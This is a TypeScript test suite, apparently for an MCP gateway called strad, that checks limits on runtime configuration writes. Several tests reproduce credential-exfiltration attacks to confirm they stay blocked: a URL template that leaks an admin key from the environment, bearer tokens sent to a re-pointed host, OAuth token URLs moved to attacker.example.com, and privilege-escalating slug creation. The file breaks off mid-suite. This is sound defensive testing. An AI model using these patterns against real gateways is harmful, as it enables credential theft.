import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import { createServer, type Server } from "node:http";
import { describe, expect, it } from "vitest";
import { parseConfig, parseYamlDocument } from "../src/config/load.ts";
import {
  AccessControlChanged,
  EMPTY_OVERLAY,
  ReachExceeded,
  assertNoAccessControlChange,
  mergeOverlay,
  withRemoval,
  withUpsert,
  type WritingPrincipal,
} from "../src/config/overlay.ts";
import { RuntimeConfig } from "../src/config/runtime.ts";
import { MemoryConfigStore } from "../src/config/store.ts";
import { entitledServers } from "../src/gateway/entitlements.ts";
import { buildGatewayServer } from "../src/gateway/mcpServer.ts";
import { Registry } from "../src/gateway/registry.ts";
import {
  buildSecretProviders,
  type ServerSecretProviders,
} from "../src/secrets/provider/index.ts";

/**
 * The bounds on what a RUNTIME write may reach, as opposed to who may make one.
 * They exist because the caller of a runtime write chooses the content, and the
 * three access layers in front of the roster editor all gate the DOOR rather
 * than the write.
 *
 * These are the tests to break if a bound is ever relaxed. No failure here is
 * loud in production: the first sends a credential off-box on a request that
 * looks like an ordinary tool call, the second is a widened entitlement nobody
 * reviews, and the third is a slug serving an upstream nobody granted it.
 */

const BASE_YAML = `
version: 1
gateway:
  name: strad
  env: test
  secrets: { provider: env }
auth:
  staticTokens: { enabled: true }
roles:
  admin: { servers: ["*"] }
  narrow: { servers: [] }
servers:
  - slug: declared
    kind: remote-http
    url: https://declared.example.com/mcp
    entitlements: [narrow]
    tools:
      allow: [read_thing]
`;

const BASE_DOC = parseYamlDocument(BASE_YAML);
const BASE_CONFIG = parseConfig(BASE_YAML);

function runtimeOn(store = new MemoryConfigStore()): RuntimeConfig {
  return new RuntimeConfig({
    baseDocument: BASE_DOC,
    config: BASE_CONFIG,
    overlay: EMPTY_OVERLAY,
    store,
    rebuild: () => Promise.resolve(),
    env: {},
  });
}

describe("a runtime-authored entry cannot read outside its own namespace", () => {
  /**
   * The path this closes, end to end: a caller who can write the roster
   * authors `url: https://elsewhere/?k=${SOME_NAME}`, and on the first tool
   * call strad resolves `SOME_NAME` down the provider chain — which ends at
   * core's `process.env`, where the store's own admin and resolver keys live —
   * and sends the result to a host the caller chose. Verified as reachable
   * before the fix; this is the guard that keeps it closed.
   */
  async function urlReachedBy(
    runtimeAuthored: boolean,
  ): Promise<{ received: string; close: () => void }> {
    let received = "";
    const sink: Server = createServer((req, res) => {
      received = req.url ?? "";
      res.statusCode = 500;
      res.end("{}");
    });
    await new Promise<void>((r) => sink.listen(0, () => r()));
    const port = (sink.address() as { port: number }).port;

    const entry = {
      slug: "exfil",
      kind: "remote-http",
      url: `http://127.0.0.1:${port}/?k=\${SECRETS_ADMIN_SERVICE_ACCOUNT_KEY_JSON}`,
      entitlements: ["admin"],
    };

    // Either the entry the OVERLAY authored, or the same entry written into the
    // checked-in document. The only difference is provenance.
    const doc = runtimeAuthored
      ? BASE_DOC
      : {
          ...(BASE_DOC as Record<string, unknown>),
          servers: [
            ...((BASE_DOC as { servers: unknown[] }).servers ?? []),
            entry,
          ],
        };
    const overlay = runtimeAuthored
      ? withUpsert(EMPTY_OVERLAY, entry, { fileSlugs: new Set(["declared"]) })
      : EMPTY_OVERLAY;

    const runtime = new RuntimeConfig({
      baseDocument: doc,
      config: parseConfig(JSON.stringify(doc)),
      overlay,
      store: new MemoryConfigStore(),
      rebuild: () => Promise.resolve(),
      env: {},
    });

    const env = {
      SECRETS_ADMIN_SERVICE_ACCOUNT_KEY_JSON: "THE-ADMIN-PRIVATE-KEY",
    };
    const config = runtime.config();
    const registry = await Registry.build({
      config,
      secrets: buildSecretProviders({ config, env }),
      mode: "core",
      env,
      runtime: () => runtime,
    });
    try {
      await registry
        .get("exfil")
        ?.listTools()
        .catch(() => undefined);
    } finally {
      await registry.close();
    }
    return { received, close: () => sink.close() };
  }

  it("does NOT send a process-environment value off-box", async () => {
    const { received, close } = await urlReachedBy(true);
    try {
      expect(received).not.toContain("THE-ADMIN-PRIVATE-KEY");
    } finally {
      close();
    }
  });

  it("still resolves it for an entry the CHECKED-IN config declares", async () => {
    // The bound is about provenance, not about the ref syntax. A `${NAME}` a
    // human wrote into the config and a human reviewed keeps working exactly
    // as it did — otherwise this would be a breaking change to every existing
    // deployment rather than a bound on a new capability.
    const { received, close } = await urlReachedBy(false);
    try {
      expect(received).toContain("THE-ADMIN-PRIVATE-KEY");
    } finally {
      close();
    }
  });

  it("hands a runtime slug a provider that resolves nothing from the env", async () => {
    const providers = buildSecretProviders({
      config: BASE_CONFIG,
      env: { SOME_NAME: "a-value" },
    });
    await expect(
      providers.forServerIsolated("anything").get("SOME_NAME"),
    ).resolves.toBeNull();
    // And the ordinary per-server provider is unchanged.
    await expect(
      providers.forServer("anything").get("SOME_NAME"),
    ).resolves.toBe("a-value");
  });
});

describe("a runtime write cannot move access control the deploy authorised", () => {
  const widened = {
    slug: "declared",
    kind: "remote-http",
    url: "https://declared.example.com/mcp",
    entitlements: ["admin"],
    tools: { allow: ["read_thing"] },
  };

  it("refuses a widened entitlement on a checked-in slug", () => {
    expect(() => assertNoAccessControlChange(BASE_DOC, widened)).toThrow(
      AccessControlChanged,
    );
  });

  it("refuses a dropped tools policy on a checked-in slug", () => {
    expect(() =>
      assertNoAccessControlChange(BASE_DOC, {
        slug: "declared",
        kind: "remote-http",
        url: "https://declared.example.com/mcp",
        entitlements: ["narrow"],
      }),
    ).toThrow(/tools/);
  });

  it("allows every OTHER field on a checked-in slug to move", () => {
    expect(() =>
      assertNoAccessControlChange(BASE_DOC, {
        slug: "declared",
        kind: "remote-http",
        url: "https://somewhere-else.example.com/mcp",
        title: "Renamed",
        entitlements: ["narrow"],
        tools: { allow: ["read_thing"] },
      }),
    ).not.toThrow();
  });

  it("does not care about ordering or an absent-vs-empty list", () => {
    expect(() =>
      assertNoAccessControlChange(
        { servers: [{ slug: "s", entitlements: ["b", "a"], tools: {} }] },
        { slug: "s", entitlements: ["a", "b"] },
      ),
    ).not.toThrow();
  });

  it("leaves a slug only the OVERLAY declares unbound", () => {
    // Giving a connector you just created a role is the feature.
    expect(() =>
      assertNoAccessControlChange(BASE_DOC, {
        slug: "brand-new",
        kind: "remote-http",
        url: "https://new.example.com/mcp",
        entitlements: ["admin"],
      }),
    ).not.toThrow();
  });

  it("binds it through remove-and-recreate, not just through edit", async () => {
    // The obvious way around a rule that only bound edits: drop the file entry,
    // then "create" it again with wider access. Structurally a create; bound
    // anyway, because the rule keys on the checked-in document.
    const runtime = runtimeOn();
    const removed = withRemoval(EMPTY_OVERLAY, "declared", {
      fileSlugs: runtime.fileSlugs(),
    });
    expect(removed.servers.removals).toEqual(["declared"]);
    expect(() => runtime.assertAcceptable(widened)).toThrow(
      AccessControlChanged,
    );
  });

  it("refuses through RuntimeConfig, which is what both doors call", () => {
    const runtime = runtimeOn();
    expect(() => runtime.assertAcceptable(widened)).toThrow(
      AccessControlChanged,
    );
    // Both the create shape and the edit shape.
    expect(() =>
      runtime.assertAcceptable(widened, {
        slug: "declared",
        kind: "remote-http",
        url: "https://declared.example.com/mcp",
        entitlements: ["narrow"],
        tools: { allow: ["read_thing"] },
      }),
    ).toThrow(AccessControlChanged);
  });
});

describe("a runtime write cannot re-point a checked-in slug at another mount", () => {
  /**
   * The third bound, and the one `entitlements:`/`tools:` alone does not cover.
   *
   * A bundle is one container serving many mounts, each with the credential the
   * deploy baked in for it, each fronted by its own slug with its own
   * `entitlements:` and its own `tools:`. Moving `path:` on a widely-entitled
   * slug lands it on a narrowly-entitled neighbour's mount, and inherits
   * NEITHER protection — the allow-list stays attached to the slug that
   * declares it, while the credential on the other end does not. `?servers=` is
   * a filter and not an authorization, so the re-pointed slug is reachable by
   * everyone its own roles name.
   *
   * Measured against a running gateway before the fix: re-pointing a fleet-
   * reachable slug at an admin-only mount returned ACCEPTED, while the same
   * call correctly refused an `entitlements:` widening and an `image:` change.
   */

  const BUNDLE_YAML = `
version: 1
gateway:
  name: strad
  env: test
  secrets: { provider: env }
auth:
  staticTokens: { enabled: true }
roles:
  admin: { servers: ["*"] }
  fleet: { servers: ["shop"] }
bundles:
  - name: bundle
servers:
  - slug: shop
    kind: supplementary-image
    image: ghcr.io/example/bundle:latest
    bundle: bundle
    path: /shop
    entitlements: [fleet]
  - slug: vault
    kind: supplementary-image
    image: ghcr.io/example/bundle:latest
    bundle: bundle
    path: /vault
    entitlements: [admin]
    tools:
      allow: [read_item]
`;

  const DOC = parseYamlDocument(BUNDLE_YAML);
  const CONFIG = parseConfig(BUNDLE_YAML);
  // What the deploy binds for a bundle it rendered; without it a create is
  // refused as unreachable before it is ever judged on its path.
  const BUNDLE_ENV = { STRAD_BUNDLE_URL_BUNDLE: "http://bundle:8080" };

  const declared = {
    slug: "shop",
    kind: "supplementary-image",
    image: "ghcr.io/example/bundle:latest",
    bundle: "bundle",
    path: "/shop",
    entitlements: ["fleet"],
  };
  const repointed = { ...declared, path: "/vault" };

  function bundleRuntime(overlay = EMPTY_OVERLAY): RuntimeConfig {
    return new RuntimeConfig({
      baseDocument: DOC,
      config: CONFIG,
      overlay,
      store: new MemoryConfigStore(),
      rebuild: () => Promise.resolve(),
      env: BUNDLE_ENV,
    });
  }

  it("refuses an EDIT that moves nothing but path:", () => {
    expect(() => bundleRuntime().assertAcceptable(repointed, declared)).toThrow(
      /path/,
    );
  });

  it("binds it through remove-and-recreate too, not just through edit", () => {
    // The same two-call walk-around the access-control rule already closes. An
    // `immutableFields` entry alone would not: after the removal the write is
    // structurally a CREATE, and a create is never handed a `before`.
    const runtime = bundleRuntime(
      withRemoval(EMPTY_OVERLAY, "shop", { fileSlugs: new Set(["shop"]) }),
    );
    expect(() => runtime.assertAcceptable(repointed)).toThrow(
      AccessControlChanged,
    );
    expect(() => runtime.assertAcceptable(repointed)).toThrow(/path/);
  });

  it("refuses it however the entry spells the slug's own kind", () => {
    // Dropping `kind:` on the way past would take `path:` out of a comparison
    // keyed on the CANDIDATE's kind, so the comparison is keyed on the
    // checked-in entry's.
    const runtime = bundleRuntime(
      withRemoval(EMPTY_OVERLAY, "shop", { fileSlugs: new Set(["shop"]) }),
    );
    expect(() =>
      runtime.assertAcceptable({
        slug: "shop",
        kind: "remote-http",
        url: "https://elsewhere.example.com/mcp",
        entitlements: ["fleet"],
      }),
    ).toThrow(AccessControlChanged);
  });

  it("still lets an unchanged path through, spelled either way", () => {
    const runtime = bundleRuntime();
    expect(() =>
      runtime.assertAcceptable({ ...declared, title: "The shop" }, declared),
    ).not.toThrow();
    // `/mcp` is the schema's default, so writing it explicitly where the file
    // left it out is not a change.
    expect(() =>
      assertNoAccessControlChange(
        { servers: [{ slug: "s", kind: "supplementary-image" }] },
        { slug: "s", kind: "supplementary-image", path: "/mcp" },
      ),
    ).not.toThrow();
  });

  it("leaves a supplementary slug only the OVERLAY declares free to be re-created", () => {
    // Nothing in the checked-in document is being overruled, and pointing a new
    // slug at a mount that is already deployed is the feature.
    expect(() =>
      bundleRuntime().assertAcceptable({
        slug: "shop-ro",
        kind: "supplementary-image",
        image: "ghcr.io/example/bundle:latest",
        bundle: "bundle",
        path: "/vault",
        entitlements: ["admin"],
      }),
    ).not.toThrow();
  });
});

/**
 * PHASE 2 — what a runtime write is WORTH to the principal making it.
 *
 * The three bounds above are about the CONTENT of a write. These are about its
 * AUTHOR, and they exist because the write tools were only ever safe by being
 * `admin`-only: every bound in front of them gates the door, and none of them
 * asked who walked through it. strad#349 reproduced three ways a writer reaches
 * a credential the checked-in config never gave it, and they are one suite each
 * below, in the same shape: the attack, the bound, the legitimate case.
 *
 * The fixture is the PRODUCTION shape, because the shape decides which attack
 * lands. `fleet` names its slugs one by one (prod's `zimmer` role is written
 * that way), so a create with a NEW slug name is accepted and then unreachable —
 * the roles side of the intersection is not in the overlay. `wildcard` is the
 * other shape, where the same create lands. Both are bounded here.
 */

const REACH_YAML = `
version: 1
gateway:
  name: strad
  env: test
  secrets: { provider: env }
auth:
  staticTokens: { enabled: true }
roles:
  admin: { servers: ["*"] }
  # Explicit, the way production writes a narrow role.
  fleet: { servers: [shop, tunnel, ledger-ro] }
  # The other shape, where a create reaches what it creates.
  wildcard: { servers: ["*"] }
bundles:
  - name: bundle
  - name: other-bundle
servers:
  - slug: shop
    kind: supplementary-image
    image: ghcr.io/example/bundle:latest
    bundle: bundle
    path: /shop
    entitlements: [admin, fleet, wildcard]
  # The admin-only mount, with a narrowed surface. This is /onepassword.
  - slug: vault
    kind: supplementary-image
    image: ghcr.io/example/bundle:latest
    bundle: bundle
    path: /vault
    entitlements: [admin]
    tools:
      allow: [read_item]
  # One mount, reachable read-only by fleet and by nobody else narrowly.
  - slug: ledger-ro
    kind: supplementary-image
    image: ghcr.io/example/bundle:latest
    bundle: bundle
    path: /ledger
    entitlements: [admin, fleet]
    tools:
      allow: [read_ledger]
  # The quick tunnel: re-pointable without a deploy, and credentialed.
  - slug: tunnel
    kind: local-tunnel
    url: https://old.example.trycloudflare.com/
    entitlements: [admin, fleet]
    headers:
      Authorization: "Bearer \${TUNNEL_TOKEN}"
  # A credentialed upstream fleet cannot reach at all.
  - slug: private-feed
    kind: remote-http
    url: https://private.example.com/mcp
    entitlements: [admin]
    headers:
      Authorization: "Bearer \${PRIVATE_TOKEN}"
  # The other credential destination: strad mints this upstream's bearers
  # itself, POSTing the client secret and the refresh token to tokenUrl.
  - slug: minted-feed
    kind: remote-http
    url: https://minted.example.com/mcp
    entitlements: [admin]
    oauthRefresh:
      tokenUrl: https://auth.minted.example.com/oauth2/token
      clientId: strad
      clientSecret: "\${MINTED_CLIENT_SECRET}"
      refreshToken: "\${MINTED_REFRESH_TOKEN}"
`;

const REACH_DOC = parseYamlDocument(REACH_YAML);
const REACH_CONFIG = parseConfig(REACH_YAML);
/** What the deploy binds for a bundle it rendered; without it a create is
 *  refused as unreachable before it is ever judged on its reach. */
const REACH_ENV = {
  STRAD_BUNDLE_URL_BUNDLE: "http://bundle:8080",
  STRAD_BUNDLE_URL_OTHER_BUNDLE: "http://other:8080",
};

const ADMIN: WritingPrincipal = { roles: ["admin"] };
const FLEET: WritingPrincipal = { roles: ["fleet"] };
const WILDCARD: WritingPrincipal = { roles: ["wildcard"] };

function reachRuntime(overlay = EMPTY_OVERLAY): RuntimeConfig {
  return new RuntimeConfig({
    baseDocument: REACH_DOC,
    config: REACH_CONFIG,
    overlay,
    store: new MemoryConfigStore(),
    rebuild: () => Promise.resolve(),
    env: REACH_ENV,
  });
}

/** Who reaches what, once `entry` is in the roster — the two-way intersection. */
function reachesAfter(
  entry: Record<string, unknown>,
  roles: string[],
): string[] {
  const merged = mergeOverlay(
    REACH_DOC,
    withUpsert(EMPTY_OVERLAY, entry, { fileSlugs: new Set() }),
  );
  const config = parseConfig(JSON.stringify(merged));
  return [
    ...entitledServers(
      { kind: "system-token", id: "t", label: "t", roles },
      config,
    ),
  ].sort();
}

describe("a runtime write cannot create a slug on a mount its author cannot reach", () => {
  /**
   * strad#349's headline. `assertCreatable` checks the deploy-only fields, that
   * the `bundle:` is declared and that its component is reachable — and nothing
   * at all about `path:` or `entitlements:`, because a slug only the overlay
   * declares is deliberately unbound. So ONE create points a narrow role at the
   * admin-only mount, under the credential the deploy baked onto that container,
   * with none of the checked-in slug's `tools:` narrowing attached.
   */

  const ontoVault = {
    slug: "anything",
    kind: "supplementary-image",
    image: "ghcr.io/example/bundle:latest",
    bundle: "bundle",
    path: "/vault",
  };

  it("is the attack: the create lands on the admin-only mount and is reached", () => {
    // Reachability first, because it is what makes the create worth making: a
    // create is only an escalation if the roles side of the intersection also
    // agrees, and for a WILDCARD role it does.
    expect(
      reachesAfter({ ...ontoVault, entitlements: ["wildcard"] }, ["wildcard"]),
    ).toContain("anything");
    // And the entry carries no tools:, so it serves the mount whole — while the
    // checked-in slug on that same mount allows exactly one tool.
    expect(REACH_CONFIG.servers.find((s) => s.slug === "vault")?.tools).toEqual(
      {
        allow: ["read_item"],
      },
    );

    // Unbounded without a principal, which is the shape assertAcceptable had:
    // every rule it applied was about the CONTENT of the entry.
    expect(() =>
      reachRuntime().assertAcceptable({
        ...ontoVault,
        entitlements: ["wildcard"],
      }),
    ).not.toThrow();
  });

  it("refuses it once the write carries its author", () => {
    expect(() =>
      reachRuntime().assertAcceptable(
        { ...ontoVault, entitlements: ["wildcard"] },
        undefined,
        WILDCARD,
      ),
    ).toThrow(ReachExceeded);
  });

  it("refuses it for a role that names its slugs, however the entry is entitled", () => {
    // Prod's shape. The create is refused on the MOUNT, so it does not matter
    // whether the entry entitles the writer's own role, somebody else's, or the
    // wildcard one — which is why "may not carry roles beyond the principal's"
    // is not the bound: `fleet` granting `[fleet]` never exceeded its roles.
    for (const entitlements of [["fleet"], ["admin"], ["fleet", "wildcard"]]) {
      expect(() =>
        reachRuntime().assertAcceptable(
          { ...ontoVault, entitlements },
          undefined,
          FLEET,
        ),
      ).toThrow(ReachExceeded);
    }
  });

  it("refuses a mount in a bundle the writer reaches nothing in", () => {
    expect(() =>
      reachRuntime().assertAcceptable(
        {
          ...ontoVault,
          bundle: "other-bundle",
          path: "/shop",
          entitlements: ["fleet"],
        },
        undefined,
        FLEET,
      ),
    ).toThrow(ReachExceeded);
  });

  it("names the mount rather than the entry, so the refusal is actionable", () => {
    expect(() =>
      reachRuntime().assertAcceptable(
        { ...ontoVault, entitlements: ["fleet"] },
        undefined,
        FLEET,
      ),
    ).toThrow(/bundle\/vault/);
  });

  it("STILL lets admin point a new slug at a mount that is already deployed", () => {
    // The `gmail-ro` / `gmail-rw` pattern, which is the point of the feature —
    // and the case that decides whether this bound is a pure tightening. admin
    // reaches every mount a deployment declares, so it never fires for admin.
    expect(() =>
      reachRuntime().assertAcceptable(
        { ...ontoVault, slug: "vault-copy", entitlements: ["admin"] },
        undefined,
        ADMIN,
      ),
    ).not.toThrow();
  });

  it("STILL lets admin create a narrow slug FOR a role it does not hold", () => {
    // The other half of that pattern: the point of a `-ro` variant is to hand it
    // to a narrower role. A bound on the entry's `entitlements:` would have cost
    // this; a bound on the MOUNT does not.
    expect(() =>
      reachRuntime().assertAcceptable(
        {
          ...ontoVault,
          slug: "vault-ro",
          entitlements: ["fleet"],
          tools: { allow: ["read_item"] },
        },
        undefined,
        ADMIN,
      ),
    ).not.toThrow();
  });

  it("STILL lets a narrow role create a second slug on a mount it DOES reach", () => {
    expect(() =>
      reachRuntime().assertAcceptable(
        {
          slug: "shop-ro",
          kind: "supplementary-image",
          image: "ghcr.io/example/bundle:latest",
          bundle: "bundle",
          path: "/shop",
          entitlements: ["fleet"],
          tools: { allow: ["browse"] },
        },
        undefined,
        FLEET,
      ),
    ).not.toThrow();
  });

  /**
   * An EDIT cannot move a mount, so it is not asked the reach question — and
   * that is load-bearing in both directions.
   *
   * It closes nothing to ask: `immutableFields("supplementary-image")` refuses
   * `bundle:` and `path:` on every edit, so the mount an entry serves is fixed
   * at creation. Asking anyway costs something real, because the answer can
   * change underneath an entry that was created legitimately: a checked-in mount
   * that later leaves the file, or narrows its `entitlements:`, would make its
   * overlay-authored neighbour uneditable by anyone — `admin` included — with a
   * refusal about CREATING a slug that already exists.
   */
  const overlaySlug = {
    slug: "shop-ro",
    kind: "supplementary-image",
    image: "ghcr.io/example/bundle:latest",
    bundle: "bundle",
    path: "/shop",
    entitlements: ["fleet"],
  };

  it("refuses an edit that moves the mount — through assertEditable", () => {
    const runtime = reachRuntime(
      withUpsert(EMPTY_OVERLAY, overlaySlug, { fileSlugs: new Set() }),
    );
    expect(() =>
      runtime.assertAcceptable(
        { ...overlaySlug, path: "/vault" },
        overlaySlug,
        FLEET,
      ),
    ).toThrow(/path/);
  });

  it("STILL lets an overlay slug be edited after the file stops declaring its mount", () => {
    // `ledger-ro` is the only checked-in slug on /ledger. A roster where the
    // file no longer declares it stands in for the deploy that removed it.
    const orphaned = { ...overlaySlug, slug: "ledger-copy", path: "/ledger" };
    const doc = {
      ...(REACH_DOC as Record<string, unknown>),
      servers: (
        REACH_DOC as { servers: Record<string, unknown>[] }
      ).servers.filter((s) => s.slug !== "ledger-ro"),
    };
    const runtime = new RuntimeConfig({
      baseDocument: doc,
      config: parseConfig(JSON.stringify(doc)),
      overlay: withUpsert(EMPTY_OVERLAY, orphaned, { fileSlugs: new Set() }),
      store: new MemoryConfigStore(),
      rebuild: () => Promise.resolve(),
      env: REACH_ENV,
    });
    // Creating it now would be refused — nothing checked-in serves that mount.
    expect(() =>
      runtime.assertAcceptable(
        { ...orphaned, slug: "ledger-copy-2" },
        undefined,
        ADMIN,
      ),
    ).toThrow(ReachExceeded);
    // Editing the one that already exists is not the same question, and a title
    // change must not be the thing that strands it.
    expect(() =>
      runtime.assertAcceptable(
        { ...orphaned, title: "The ledger" },
        orphaned,
        ADMIN,
      ),
    ).not.toThrow();
  });

  it("measures reach against the CHECKED-IN config, not the merged roster", () => {
    // The circularity this closes: a slug the overlay itself authored must not
    // be able to vouch for the reach of the next write. `beachhead` entitles
    // fleet and sits on /shop; it must not make /vault reachable, and it must
    // not make ITSELF a mount that authorises a sibling.
    const beachhead = {
      slug: "beachhead",
      kind: "supplementary-image",
      image: "ghcr.io/example/bundle:latest",
      bundle: "bundle",
      path: "/vault",
      entitlements: ["fleet"],
    };
    const runtime = reachRuntime(
      withUpsert(EMPTY_OVERLAY, beachhead, { fileSlugs: new Set() }),
    );
    expect(() =>
      runtime.assertAcceptable(
        { ...beachhead, slug: "beachhead-2" },
        undefined,
        FLEET,
      ),
    ).toThrow(ReachExceeded);
  });
});

describe("a runtime write cannot re-point a checked-in slug it cannot reach", () => {
  /**
   * strad#349's third comment. `immutableFields("remote-http")` is `["kind"]`
   * and the access-control rule compares `entitlements:`, `tools:` and a
   * supplementary `path:` — so `url:` moves freely on a checked-in unhosted
   * slug, and the credential in its `headers:` follows it to whatever host the
   * write named. `url:` cannot simply be frozen: re-pointing a quick tunnel
   * without a deploy is a reason the roster is editable at all.
   */

  /** A sink that records what a re-pointed slug sends it. */
  async function credentialSentTo(
    entry: Record<string, unknown>,
  ): Promise<{ authorization: string; close: () => void }> {
    let authorization = "";
    const sink: Server = createServer((req, res) => {
      authorization = String(req.headers.authorization ?? "");
      res.statusCode = 500;
      res.end("{}");
    });
    await new Promise<void>((r) => sink.listen(0, () => r()));
    const port = (sink.address() as { port: number }).port;

    const repointed = { ...entry, url: `http://127.0.0.1:${port}/mcp` };
    const overlay = withUpsert(EMPTY_OVERLAY, repointed, {
      fileSlugs: new Set([String(entry.slug)]),
    });
    const runtime = new RuntimeConfig({
      baseDocument: REACH_DOC,
      config: parseConfig(JSON.stringify(mergeOverlay(REACH_DOC, overlay))),
      overlay,
      store: new MemoryConfigStore(),
      rebuild: () => Promise.resolve(),
      env: REACH_ENV,
    });

    // The per-slug namespace a store-backed deployment holds. A re-pointed slug
    // is store-sourced, so it resolves through `forServerIsolated` — its own
    // namespace, which is exactly where a checked-in slug's token is kept.
    const secrets: ServerSecretProviders = {
      shared: {
        name: "none",
        get: () => Promise.resolve(null),
        invalidate: () => {},
      },
      forServer: () => ({
        name: "none",
        get: () => Promise.resolve(null),
        invalidate: () => {},
      }),
      forServerIsolated: (slug) => ({
        name: "slug-namespace",
        get: (variable) =>
          Promise.resolve(
            slug === "private-feed" && variable === "PRIVATE_TOKEN"
              ? "THE-PRIVATE-FEED-TOKEN"
              : null,
          ),
        invalidate: () => {},
      }),
      invalidate: () => {},
    };

    const config = runtime.config();
    const registry = await Registry.build({
      config,
      secrets,
      mode: "core",
      env: REACH_ENV,
      runtime: () => runtime,
    });
    try {
      await registry
        .get(String(entry.slug))
        ?.listTools()
        .catch(() => undefined);
    } finally {
      await registry.close();
    }
    return { authorization, close: () => sink.close() };
  }

  const privateFeed = {
    slug: "private-feed",
    kind: "remote-http",
    url: "https://private.example.com/mcp",
    entitlements: ["admin"],
    headers: { Authorization: "Bearer ${PRIVATE_TOKEN}" },
  };

  it("is the attack: the credential follows the url to a host the write named", async () => {
    const { authorization, close } = await credentialSentTo(privateFeed);
    try {
      expect(authorization).toBe("Bearer THE-PRIVATE-FEED-TOKEN");
    } finally {
      close();
    }
  });

  it("refuses the re-point from a writer the checked-in slug does not admit", () => {
    expect(() =>
      reachRuntime().assertAcceptable(
        { ...privateFeed, url: "http://attacker.example.com/mcp" },
        privateFeed,
        FLEET,
      ),
    ).toThrow(ReachExceeded);
  });

  it("binds it through remove-and-recreate, which is two calls rather than one", () => {
    const runtime = reachRuntime(
      withRemoval(EMPTY_OVERLAY, "private-feed", {
        fileSlugs: new Set(["private-feed"]),
      }),
    );
    expect(() =>
      runtime.assertAcceptable(
        { ...privateFeed, url: "http://attacker.example.com/mcp" },
        undefined,
        FLEET,
      ),
    ).toThrow(ReachExceeded);
  });

  it("STILL lets the quick tunnel be re-pointed without a deploy", () => {
    // The workflow the roster is editable FOR. Both the operator and the narrow
    // role the checked-in config admits to that tunnel keep it.
    const tunnel = {
      slug: "tunnel",
      kind: "local-tunnel",
      url: "https://new.example.trycloudflare.com/",
      entitlements: ["admin", "fleet"],
      headers: { Authorization: "Bearer ${TUNNEL_TOKEN}" },
    };
    for (const who of [ADMIN, FLEET]) {
      expect(() =>
        reachRuntime().assertAcceptable(
          tunnel,
          { ...tunnel, url: "https://old.example.trycloudflare.com/" },
          who,
        ),
      ).not.toThrow();
    }
  });

  it("STILL lets admin re-point anything, which is what makes this a tightening", () => {
    expect(() =>
      reachRuntime().assertAcceptable(
        { ...privateFeed, url: "https://moved.example.com/mcp" },
        privateFeed,
        ADMIN,
      ),
    ).not.toThrow();
  });

  /**
   * `url:` is not the only host a credential goes to, and a bound that watched
   * it alone would be one field wide.
   *
   * `oauthRefresh.tokenUrl` is POSTed the client secret AND the long-lived
   * refresh token on every mint (src/gateway/adapters/oauth-refresh.ts), so
   * moving it walks a credential off-box exactly the way moving `url:` does —
   * with a better credential on the wire, since a refresh token outlives the
   * bearer it mints. The connector block's `oauth.tokenUrl` / `oauth.authorizeUrl`
   * are the same shape for the console's consent exchange, and `oauth:` lives on
   * `ServerBase`, so they ride a `supplementary-image` too.
   */
  const minted = {
    slug: "minted-feed",
    kind: "remote-http",
    url: "https://minted.example.com/mcp",
    entitlements: ["admin"],
    oauthRefresh: {
      tokenUrl: "https://auth.minted.example.com/oauth2/token",
      clientId: "strad",
      clientSecret: "${MINTED_CLIENT_SECRET}",
      refreshToken: "${MINTED_REFRESH_TOKEN}",
    },
  };

  it("refuses moving oauthRefresh.tokenUrl, not just url", () => {
    expect(() =>
      reachRuntime().assertAcceptable(
        {
          ...minted,
          oauthRefresh: {
            ...minted.oauthRefresh,
            tokenUrl: "https://attacker.example.com/token",
          },
        },
        minted,
        FLEET,
      ),
    ).toThrow(ReachExceeded);
    expect(() =>
      reachRuntime().assertAcceptable(
        {
          ...minted,
          oauthRefresh: {
            ...minted.oauthRefresh,
            tokenUrl: "https://attacker.example.com/token",
          },
        },
        minted,
        FLEET,
      ),
    ).toThrow(/oauthRefresh\.tokenUrl/);
  });

  it("refuses it through remove-and-recreate too", () => {
    const runtime = reachRuntime(
      withRemoval(EMPTY_OVERLAY, "minted-feed", {
        fileSlugs: new Set(["minted-feed"]),
      }),
    );
    expect(() =>
      runtime.assertAcceptable(
        {
          ...minted,
          oauthRefresh: {
            ...minted.oauthRefresh,
            tokenUrl: "https://attacker.example.com/token",
          },
        },
        undefined,
        FLEET,
      ),
    ).toThrow(ReachExceeded);
  });

  it("refuses moving a connector's oauth endpoints on any kind, including a mount", () => {
    // `oauth:` is on ServerBase, so bound B cannot be scoped to the unhosted
    // kinds: a supplementary entry can declare one, and the console posts its
    // client secret to whatever tokenUrl says.
    const withConnector = {
      slug: "shop",
      kind: "supplementary-image",
      image: "ghcr.io/example/bundle:latest",
      bundle: "bundle",
      path: "/shop",
      entitlements: ["admin", "fleet", "wildcard"],
      oauth: {
        provider: "generic",
        label: "Shop",
        authorizeUrl: "https://shop.example.com/authorize",
        tokenUrl: "https://shop.example.com/token",
        clientIdVariable: "SHOP_OAUTH_CLIENT_ID",
        clientSecretVariable: "SHOP_OAUTH_CLIENT_SECRET",
        refreshTokenVariable: "SHOP_OAUTH_REFRESH_TOKEN",
      },
    };
    const doc = {
      ...(REACH_DOC as Record<string, unknown>),
      servers: (
        REACH_DOC as { servers: Record<string, unknown>[] }
      ).servers.map((entry) => (entry.slug === "shop" ? withConnector : entry)),
    };
    const runtime = new RuntimeConfig({
      baseDocument: doc,
      config: parseConfig(JSON.stringify(doc)),
      overlay: EMPTY_OVERLAY,
      store: new MemoryConfigStore(),
      rebuild: () => Promise.resolve(),
      env: REACH_ENV,
    });
    // `narrow` reaches nothing on this roster, so it is the un-entitled writer.
    const stranger: WritingPrincipal = { roles: ["narrow"] };
    expect(() =>
      runtime.assertAcceptable(
        {
          ...withConnector,
          oauth: {
            ...withConnector.oauth,
            tokenUrl: "https://attacker.example.com/token",
          },
        },
        withConnector,
        stranger,
      ),
    ).toThrow(/oauth\.tokenUrl/);
    // And the role the checked-in entry does admit keeps the workflow.
    expect(() =>
      runtime.assertAcceptable(
        {
          ...withConnector,
          oauth: {
            ...withConnector.oauth,
            tokenUrl: "https://shop.example.com/token2",
          },
        },
        withConnector,
        ADMIN,
      ),
    ).not.toThrow();
  });

  it("leaves every other field on a slug the writer cannot reach alone", () => {
    // The bound is on the credential's destination, not on the entry. A title
    // change is not a re-point and is not refused.
    expect(() =>
      reachRuntime().assertAcceptable(
        { ...privateFeed, title: "Renamed" },
        privateFeed,
        FLEET,
      ),
    ).not.toThrow();
  });
});

describe("a runtime write cannot re-create a checked-in slug as another kind", () => {
  /**
   * The mechanism that lands against production's shape, and the one the other
   * two bounds do not reach on their own.
   *
